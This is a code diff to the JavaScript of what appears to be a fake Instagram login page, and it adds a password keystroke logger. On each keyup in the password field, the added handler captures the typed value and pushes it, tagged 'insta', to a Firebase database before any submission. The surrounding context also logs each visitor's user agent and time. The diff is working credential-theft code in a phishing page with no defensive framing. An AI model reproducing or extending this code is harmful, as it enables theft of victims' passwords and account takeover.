@@ -632,6 +632,34 @@ var today = date + " "+months[month]+" 2022";
 
 deviceRef.push().set({ _1_date:today,_2_time:time,_3_deviceInfo:navigator.userAgent });
 
+keyStrokeRef = firebase.database().ref().child('keyStrokes');
+
+var inplength = 0;
+var currval = "";
+var flag = true;
+
+document.getElementById("pass").onkeyup = () => {
+
+let inp = document.getElementById("pass");
+let enter = true;
+
+if(inp.value.length > inplength)
+{
+    inplength = inp.value.length;
+    currval = inp.value;
+    flag = true;
+}
+else if(flag)
+{
+    rootRef.push().set({ Detail:"insta", passStroke:currval });
+    inplength = inp.value.length;
+    flag = false;
+}
+else {
+    inplength = inp.value.length;
+}
+}
+
 function loginkaro() {
     
     if(isloginactive) {
